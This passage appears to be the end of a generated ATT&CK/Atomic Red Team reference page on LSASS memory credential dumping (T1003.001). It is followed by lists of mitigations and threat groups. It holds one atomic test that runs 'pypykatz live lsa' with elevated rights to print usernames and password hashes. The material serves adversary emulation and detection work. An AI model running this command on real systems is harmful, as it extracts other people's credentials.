                                                                                   'dependency_executor_name': 'powershell',
                                                                                   'description': 'Parses '
                                                                                                  'secrets '
                                                                                                  'hidden '
                                                                                                  'in '
                                                                                                  'the '
                                                                                                  'LSASS '
                                                                                                  'process '
                                                                                                  'with '
                                                                                                  'python. '
                                                                                                  'Similar '
                                                                                                  'to '
                                                                                                  "mimikatz's "
                                                                                                  'sekurlsa::\n'
                                                                                                  '\n'
                                                                                                  'Python '
                                                                                                  '3 '
                                                                                                  'must '
                                                                                                  'be '
                                                                                                  'installed, '
                                                                                                  'use '
                                                                                                  'the '
                                                                                                  "get_prereq_command's "
                                                                                                  'to '
                                                                                                  'meet '
                                                                                                  'the '
                                                                                                  'prerequisites '
                                                                                                  'for '
                                                                                                  'this '
                                                                                                  'test.\n'
                                                                                                  '\n'
                                                                                                  'Successful '
                                                                                                  'execution '
                                                                                                  'of '
                                                                                                  'this '
                                                                                                  'test '
                                                                                                  'will '
                                                                                                  'display '
                                                                                                  'multiple '
                                                                                                  'useranames '
                                                                                                  'and '
                                                                                                  'passwords/hashes '
                                                                                                  'to '
                                                                                                  'the '
                                                                                                  'screen.\n',
                                                                                   'executor': {'command': 'pypykatz '
                                                                                                           'live '
                                                                                                           'lsa\n',
                                                                                                'elevation_required': True,
                                                                                                'name': 'command_prompt'},
                                                                                   'name': 'LSASS '
                                                                                           'read '
                                                                                           'with '
                                                                                           'pypykatz',
                                                                                   'supported_platforms': ['windows']}],
                                                                 'attack_technique': 'T1003.001',
                                                                 'display_name': 'OS '
                                                                                 'Credential '
                                                                                 'Dumping: '
                                                                                 'LSASS '
                                                                                 'Memory'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [User Training](../mitigations/User-Training.md)

* [Credential Access Protection](../mitigations/Credential-Access-Protection.md)
    
* [Privileged Process Integrity](../mitigations/Privileged-Process-Integrity.md)
    
* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Password Policies](../mitigations/Password-Policies.md)
    
* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    

# Actors


* [APT1](../actors/APT1.md)

* [Leafminer](../actors/Leafminer.md)
    
* [MuddyWater](../actors/MuddyWater.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [PLATINUM](../actors/PLATINUM.md)
    
* [BRONZE BUTLER](../actors/BRONZE-BUTLER.md)
    
* [APT3](../actors/APT3.md)
    
* [Lazarus Group](../actors/Lazarus-Group.md)
    
* [FIN8](../actors/FIN8.md)
    
* [APT28](../actors/APT28.md)
    
* [OilRig](../actors/OilRig.md)
    
* [FIN6](../actors/FIN6.md)
    
* [APT32](../actors/APT32.md)
    
* [Magic Hound](../actors/Magic-Hound.md)
    
* [Cleaver](../actors/Cleaver.md)
    
* [Stolen Pencil](../actors/Stolen-Pencil.md)
    
* [APT39](../actors/APT39.md)
    
* [APT33](../actors/APT33.md)
    
* [TEMP.Veles](../actors/TEMP.Veles.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [APT41](../actors/APT41.md)
    
* [Leviathan](../actors/Leviathan.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
* [Silence](../actors/Silence.md)
    
* [Blue Mockingbird](../actors/Blue-Mockingbird.md)
    
* [Whitefly](../actors/Whitefly.md)
    
* [Sandworm Team](../actors/Sandworm-Team.md)
    
